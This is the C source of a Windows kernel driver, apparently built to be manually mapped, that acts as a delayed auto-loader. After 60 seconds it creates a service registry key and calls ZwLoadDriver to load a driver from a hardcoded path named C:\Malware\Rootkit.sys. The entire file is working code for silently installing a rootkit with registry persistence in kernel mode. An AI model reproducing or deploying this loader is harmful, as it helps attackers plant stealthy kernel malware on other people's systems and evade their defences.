#include <ntddk.h>
#include <ntstrsafe.h>


#define THREAD_INTERVAL_SEC 60
#define DRIVER_TO_LOAD_PATH L"C:\\Malware\\Rootkit.sys"


static HANDLE gThread = NULL;
static BOOLEAN gStopThread = FALSE;


VOID UnloadDriver(PDRIVER_OBJECT DriverObject);
VOID LoaderThread(PVOID StartContext);
NTSTATUS CreateServiceKeyAndLoad(PCWSTR DosPath);


NTSTATUS CustomDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrint("KernelModeAutoLoader -> DriverEntry: Driver loaded\n");

	DriverObject->DriverUnload = UnloadDriver;

	NTSTATUS status = PsCreateSystemThread(&gThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, LoaderThread, NULL);

	if (!NT_SUCCESS(status)) {
		DbgPrint("KernelModeAutoLoader -> Failed to create loader thread: 0x%X\n", status);
	}
	else {
		DbgPrint("KernelModeAutoLoader -> Loader thread created successfully\n");
	}

	return status;
}


VOID UnloadDriver(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	gStopThread = TRUE;

	if (gThread) {
		PETHREAD threadObj;
		NTSTATUS st = ObReferenceObjectByHandle(gThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&threadObj, NULL);

		ZwClose(gThread);
		gThread = NULL;

		if (NT_SUCCESS(st)) {
			DbgPrint("KernelModeAutoLoader -> Waiting for loader thread to terminate...\n");
			KeWaitForSingleObject(threadObj, Executive, KernelMode, FALSE, NULL);
			ObDereferenceObject(threadObj);
			DbgPrint("KernelModeAutoLoader -> Loader thread terminated\n");
		}
	}

	DbgPrint("KernelModeAutoLoader -> Driver unloaded\n");
}


VOID LoaderThread(PVOID StartContext)
{
	UNREFERENCED_PARAMETER(StartContext);

	LARGE_INTEGER interval;
	interval.QuadPart = -(LONGLONG)THREAD_INTERVAL_SEC * 10 * 1000 * 1000;

	ULONG elapsedSeconds = 0;
	BOOLEAN driverLoaded = FALSE;

	DbgPrint("KernelModeAutoLoader -> Loader thread started\n");

	while (!gStopThread) {

		KeDelayExecutionThread(KernelMode, FALSE, &interval);

		elapsedSeconds += THREAD_INTERVAL_SEC;

		if (!driverLoaded && elapsedSeconds >= 60) {
			DbgPrint("KernelModeAutoLoader -> %lu seconds elapsed, loading driver: %ws\n", elapsedSeconds, DRIVER_TO_LOAD_PATH);
			NTSTATUS status = CreateServiceKeyAndLoad(DRIVER_TO_LOAD_PATH);
			if (NT_SUCCESS(status)) {
				DbgPrint("KernelModeAutoLoader -> Driver loaded successfully\n");
			}
			else {
				DbgPrint("KernelModeAutoLoader -> Failed to load driver: 0x%X\n", status);
			}
			driverLoaded = TRUE;
		}
	}

	DbgPrint("KernelModeAutoLoader -> Loader thread exiting\n");
	PsTerminateSystemThread(STATUS_SUCCESS);
}


NTSTATUS CreateServiceKeyAndLoad(PCWSTR DosPath)
{
	WCHAR ntPathBuf[512];
	RtlStringCchPrintfW(ntPathBuf, RTL_NUMBER_OF(ntPathBuf), (DosPath[0] == L'\\') ? L"%ws" : L"\\??\\%ws", DosPath);

	DbgPrint("KernelModeAutoLoader -> Preparing registry service key for driver: %ws\n", ntPathBuf);

	PCWSTR fileName = wcsrchr(ntPathBuf, L'\\');
	fileName = fileName ? fileName + 1 : ntPathBuf;

	WCHAR svcName[260];
	wcsncpy_s(svcName, RTL_NUMBER_OF(svcName), fileName, _TRUNCATE);

	WCHAR* dot = wcsrchr(svcName, L'.');
	if (!dot || _wcsicmp(dot, L".sys") != 0) {
		DbgPrint("KernelModeAutoLoader -> Invalid driver file extension\n");
		return STATUS_INVALID_PARAMETER;
	}
	*dot = L'\0';

	WCHAR regBuf[512];
	RtlStringCchPrintfW(regBuf, RTL_NUMBER_OF(regBuf), L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%ws", svcName);

	UNICODE_STRING regUS;
	OBJECT_ATTRIBUTES oa;
	RtlInitUnicodeString(&regUS, regBuf);
	InitializeObjectAttributes(&oa, &regUS, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	HANDLE hKey;
	NTSTATUS st = ZwCreateKey(&hKey, KEY_WRITE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
	if (!NT_SUCCESS(st)) {
		DbgPrint("KernelModeAutoLoader -> Failed to create registry key: 0x%X\n", st);
		return st;
	}

	ULONG typeVal = 1, startVal = 3;
	UNICODE_STRING name;

	RtlInitUnicodeString(&name, L"Type");
	ZwSetValueKey(hKey, &name, 0, REG_DWORD, &typeVal, sizeof(typeVal));

	RtlInitUnicodeString(&name, L"Start");
	ZwSetValueKey(hKey, &name, 0, REG_DWORD, &startVal, sizeof(startVal));

	RtlInitUnicodeString(&name, L"ImagePath");
	ZwSetValueKey(hKey, &name, 0, REG_EXPAND_SZ, ntPathBuf, (ULONG)((wcslen(ntPathBuf) + 1) * sizeof(WCHAR)));

	ZwClose(hKey);

	DbgPrint("KernelModeAutoLoader -> Registry key created, calling ZwLoadDriver\n");

	st = ZwLoadDriver(&regUS);

	if (NT_SUCCESS(st)) {
		DbgPrint("KernelModeAutoLoader -> ZwLoadDriver succeeded\n");
	}
	else {
		DbgPrint("KernelModeAutoLoader -> ZwLoadDriver failed: 0x%X\n", st);
	}

	return st;
}